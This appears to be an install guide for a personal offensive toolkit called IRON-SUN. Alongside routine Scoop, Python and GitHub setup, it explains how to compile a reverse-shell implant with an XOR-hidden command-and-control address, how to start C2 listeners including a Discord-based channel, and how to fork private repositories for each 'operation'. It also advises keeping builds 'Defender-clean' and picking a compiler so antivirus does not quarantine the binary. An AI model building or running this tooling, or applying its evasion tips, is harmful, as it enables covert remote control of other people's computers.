# IRON-SUN — INSTALL GUIDE

Cold-start on any Windows 11 machine. No admin required.
Read top to bottom. Each section builds on the previous.

---

## 1. REQUIREMENTS

- Windows 10/11 (tested: Win11 Home 26200 24H2)
- Internet access for package downloads
- GitHub account with SSH key configured
- Approximately 500MB disk space

---

## 2. SCOOP (USER-SPACE PACKAGE MANAGER)

Installs everything to `~\scoop\` with no admin rights needed.

```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression
```

Verify:
```powershell
scoop --version
```

---

## 3. CORE TOOLS

```powershell
scoop install gcc    # MinGW GCC 15.x — C compiler for vader_shell.c
scoop install gh     # GitHub CLI — for repo operations
scoop install python # Python 3.14.x — for all Python C2 scripts
```

---

## 4. PATH FIX (RUN EVERY SESSION or add to profile)

The Microsoft Store Python stub intercepts `python`. Fix by prepending Scoop to PATH:

```powershell
$env:PATH = "$env:USERPROFILE\scoop\apps\python\current;" +
            "$env:USERPROFILE\scoop\apps\python\current\Scripts;" +
            "$env:USERPROFILE\scoop\shims;" +
            "$env:USERPROFILE\scoop\apps\gcc\current\bin;" +
            $env:PATH
```

Add to PowerShell profile for permanent fix:
```powershell
notepad $PROFILE
# Paste the PATH lines above, save
```

Verify:
```powershell
python --version    # should show 3.14.x
gcc --version       # should show 15.x
gh --version        # should show 2.x
```

---

## 5. SSH KEY FOR GITHUB

If not already set up:
```powershell
ssh-keygen -t ed25519 -C "rainfantry"
# Accept default path (~/.ssh/id_ed25519)
# Passphrase optional

Get-Content "$env:USERPROFILE\.ssh\id_ed25519.pub"
# Copy output → GitHub Settings → SSH Keys → New SSH Key
```

Test:
```powershell
ssh -T git@github.com
# Should say: Hi rainfantry! You've successfully authenticated...
```

---

## 6. GH CLI AUTH

```powershell
gh auth login
# Select: GitHub.com → SSH → paste SSH key → Login with a web browser
```

Required for `designate.py --create` to fork operations.

---

## 7. CLONE IRON-SUN

```powershell
cd ~
git clone git@github.com:rainfantry/iron-sun.git
cd iron-sun
```

---

## 8. PYTHON DEPENDENCIES

```powershell
pip install requests discord.py
```

- `requests` — HTTP operations in discord_c2.py
- `discord.py` — Discord transport (deprecated, kept for backward compat)

---

## 9. COMPILE vader_shell.c

```powershell
cd shell

# Standard build (Defender-clean on RADON 2026-06-25):
gcc vader_shell.c -o vader_shell.exe -lws2_32 -lwininet -include ws2tcpip.h -D_WIN32_WINNT=0x0600

# Verify: check file size (~319KB), check no AV quarantine after 30s
```

**Before compiling** — update XOR-encoded C2 IP in vader_shell.c:
```
python vader_listener.py --gen
# Copy the xC2Addr array output into vader_shell.c, then recompile
```

---

## 10. START LISTENER

```powershell
# Simple listener (standalone, no C2 console):
python shell/vader_listener.py 4443

# Full dual-channel C2 console:
python shell/vader_c2_v2.py
```

---

## 11. FORK A NEW OPERATION

When starting a new op, fork iron-sun with a fresh callsign:

```powershell
python designate.py              # preview callsign
python designate.py --create     # forge new private repo
```

This creates e.g. `rainfantry/kfir-digger` as a private fork.
Clone that on the op machine and work there — never commit ops back to iron-sun.

---

## 12. GIT PUSH IRON-SUN UPDATES

If you've updated iron-sun itself (new tools, new banners, etc.):

```powershell
cd iron-sun
git add -p                  # stage changes selectively
git commit -m "message"
git push iron-sun main      # push to iron-sun remote
```

Remote setup (if not already set):
```powershell
git remote add iron-sun git@github.com:rainfantry/iron-sun.git
```

---

## TROUBLESHOOTING

| Problem | Fix |
|---|---|
| `python` opens Microsoft Store | Fix PATH (Section 4) |
| `gcc` not found | `scoop install gcc` + fix PATH |
| `ssh -T git@github.com` fails | Generate + upload SSH key (Section 5) |
| `gh: not found` | `scoop install gh` + fix PATH |
| vader_shell.c compile error `addrinfo` | Add `-include ws2tcpip.h` to gcc cmd |
| Defender quarantines binary | Use gcc build, not MSVC/cl.exe |
| `git push iron-sun` → repo not found | Create repo on GitHub first, or `python designate.py --create` |
